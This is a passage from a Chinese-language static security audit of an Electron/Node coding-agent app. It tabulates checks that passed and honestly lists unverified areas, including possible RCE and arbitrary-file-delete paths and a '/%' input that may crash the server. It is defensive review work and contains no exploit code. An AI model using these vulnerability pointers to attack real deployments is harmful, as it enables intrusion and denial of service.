| token 是否进日志/事件流 | **未发现**：SSE `push` 只序列化事件对象；`events.jsonl` 落的是 Pi 原始事件；无 `console.*` 打印 token | `server.ts:280-283`、`main.ts:166-168` |
| 静态资源目录穿越 | **已正确防护**：`path.normalize(path.join(uiDist, rel))` + `startsWith(uiDist + sep)`，越界 403；`decodeURIComponent` 抛错也不会绕过（在 `sendFile` 的 try 之外，最坏是未捕获异常——见「未覆盖区域」） | `server.ts:333-341` |
| Electron 窗口设置 | **正确**：`contextIsolation: true`、`nodeIntegration: false`、`sandbox: true`，未设 `webSecurity: false` | `desktop/src/main.ts:447-452` |
| preload 暴露面 | **很窄**：只有 5 个窗口控制方法，无文件/命令/IPC 通配，`ipcMain` 只注册 4 个固定通道 | `desktop/src/preload.ts:24-35`、`main.ts:479-492` |
| 导航与弹窗拦截 | **已拦截**：`will-navigate` 无条件 `preventDefault()`；`setWindowOpenHandler` 只把 http/https 交给系统浏览器、其余 deny（副作用：模型输出里的 `file://`/自定义协议链接打不开，属安全取舍） | `main.ts:461-465` |
| `ELECTRON_RUN_AS_NODE` 子进程参数 | **无注入**：`spawn(process.execPath, [coreEntry])` 用 argv 数组，无 shell；`boot-env.ts` 对宿主 `CORE_*` 全部丢弃并钉死 `CORE_HOST=127.0.0.1`、清空 `CORE_ALLOWED_HOSTS`、删除 `CORE_TOKEN` | `main.ts:268-272`、`boot-env.ts:70-96` |
| Markdown XSS | **无**：`ReactMarkdown` 未启用 `rehype-raw`，也不传 `rehypePlugins`（全仓 grep 只此一处），原始 HTML 按文本渲染 | `Markdown.tsx:122` |
| `dangerouslySetInnerHTML` 三处 | **均安全**：`Markdown.tsx:56` 与 `PreviewPane.tsx:583` 是 shiki `codeToHtml` 输出（文本经转义，失败回退分支还有自研 `escapeHtml`，`PreviewPane.tsx:207-209`）；`PreviewPane.tsx:264` 同源 | `Markdown.tsx:35-64`、`PreviewPane.tsx:230-267,553-585` |
| HTML 文件预览是否会执行脚本 | **不会**：用 `<iframe sandbox="" srcDoc={...}>`（空 sandbox = 禁脚本/禁同源），且 `X-Frame-Options`/`srcdoc` 不涉及 token | `PreviewPane.tsx:521-527`、`180-184` |
| 命令拼接执行点 | **只有 2 处，其余均安全**：`providers.ts:616`（P0-2，问题点）；`skills-install.ts:116` 与 `fs-search.ts:84` 都是 argv 数组 + `windowsHide`，无 shell 字符串拼接 | 全仓 grep `execSync\|execFileSync\|spawn\(` |
| zip-slip / 解压类操作 | **不存在**：全仓无 zip/tar 解包代码；技能安装用 `fs.promises.cp` + `rename`，且有 `assertSkillDirSafe` 拒符号链接（422）、条目数上限、`.git` 过滤、staging+rename 原子落盘 | `skills-install.ts:279-334,440-459` |
| `/skills/install` 的路径形状 | **不能越界**：`SOURCE_PATTERN` 只收 `owner/repo`；`sanitizeDirName` 把非 `[\w.-]` 换 `-` 并去首尾点/横线（因此 `skillId` 里不可能有路径分隔符或 `..`）；目标只可能是 `<agentDir>/skills/`（user）或 `<cwd>/.pi/skills/`（project），后者还要过信任门 | `skills-install.ts:40,97-100,418,393-395`；`session.ts:1316-1324` |
| `run/core.json` / `events.jsonl` / `models.json` 权限 | **代码意图正确**：`run/` 0700 + `chmodQuiet`、`core.json` 0600、`events.jsonl` 0600、`models.json`/sidecar 原子写 0600 + chmod 兜底；POSIX 有效，Windows 无 POSIX 语义（见 §2b） | `main.ts:44-56,155-165`、`providers.ts:186-199`、`core/scripts/file-perms-check.mjs:175` |
| `packages/web` bin 脚本提权面 | **无**：`pi-web.mjs` 只设 2 个默认值（`CORE_UI_DIST`、`CORE_RUN_DIR=~/.pi-web`）后 `await import(dist/main.js)`；不 eval、不读用户输入、不 sudo；`bin` 只声明 `pi-web` | `web/bin/pi-web.mjs:23-32`、`web/package.json` |
| 上游包用法 | **未见不安全调用形式**：`@earendil-works/pi-coding-agent` 的用法集中在 `ModelRuntime` / `AgentSession` / `DefaultResourceLoader` / `DefaultPackageManager` / `parseFrontmatter`；两处 `import.meta.resolve` + `file://` 深路径导入（`models.ts:48-52`、`providers.ts:231-233`）是绕过 `exports` 地图的**功能**需要，本身不引入输入面 | `models.ts:48`、`providers.ts:228-239` |

---

## 4. 未覆盖区域（诚实声明）

1. **上游 `@earendil-works/pi-coding-agent` 内部实现未审**（按任务要求排除 `pi/` 与 `node_modules/`）。以下能力直接来自上游，我只审了**本项目对它的调用形态**，没有审它的实现：
   - `DefaultPackageManager.installAndPersist(source, {local})` / `update(source)`（`session.ts:1398`、`1414`）——`source` 来自 `POST /packages/install` 请求体（`server.ts:914-932`）。**我没有验证**它是否会把 `source` 当本地路径/npm spec 处理并触发 `postinstall` 脚本；如果会，那是**未文档化的第三条 RCE 路径**，需要专门审上游 `package-manager.js`。
   - `SessionManager.findById`（`sessions.ts:530`）——`renameSession`/`deleteSession`/`readSessionImage` 都以它为收敛点（注释称「不接受路径，天然免疫目录穿越」），我**没有读上游实现**去证伪这个前提；若它内部会 join 用户传入的 id，`deleteSession` 的 `fs.unlinkSync(file)`（`session.ts:1005`）就是一个删除任意文件的点。
   - `ModelRuntime.saveProviders` 之外的 `refresh`、以及 Pi 自身对 `models.json` 里 `apiKey` 的 `$ENV`/`!` 处理（我只审了本项目 `providers.ts` 的实现）。
2. **网络层实际行为未动态验证**：以上均为静态阅读结论，**没有**起服务发真实请求复现（P0-1 的 `<script src>` 取证、P0-2 的 `!` 命令执行、P0-3 的 SSRF 都只做了代码级确认）。任务要求「只读代码」，故未做；但 P0-1/P0-2 都极易构造 3 行 PoC，建议验证后再定稿。
3. **`server.ts:377` 的 async handler 无 try/catch**：`serveStatic` 里 `decodeURIComponent(urlPath)`（`server.ts:333`）在 `urlPath` 含非法百分号编码（如 `/%`）时会抛 `URIError`；因为 `createServer(async ...)` 的返回值没人 await，这会成为 unhandled rejection。Node 22 默认 `--unhandled-rejections=throw` → **进程退出**。我**没能静态确认**这条路径是否可从外部稳定触发（`new URL("/%", ...)` 的行为需要实测），所以没把它列成正式条目；若实测可触发，它是一个**远程 DoS**（桌面版会让用户窗口直接报「后台服务已退出」）。
4. **`packages/ui` 绝大部分组件未读**（只读了与注入/渲染/传输相关的 7 个文件）；`store/`、`screens/`、`components/shell/` 其余部分、`mock/` 未审。
5. **未审**：`scripts/package-*.mjs`（打包脚本）、`.github/` CI 工作流（`NPM_TOKEN` 等 secret 的使用方式）、`.workbuddy/`、`packages/*/package-lock.json` 的依赖树（按任务要求不报「版本老旧」类问题）。
6. **Windows ACL 的实际权限**：`file-perms-check.mjs` 的 0600 断言只在 POSIX 有意义；Windows 上 `run/core.json` 的真实可达性取决于安装路径与用户 profile ACL，我没有实测（这也影响 P2「同机其它用户读 token」的定级）。
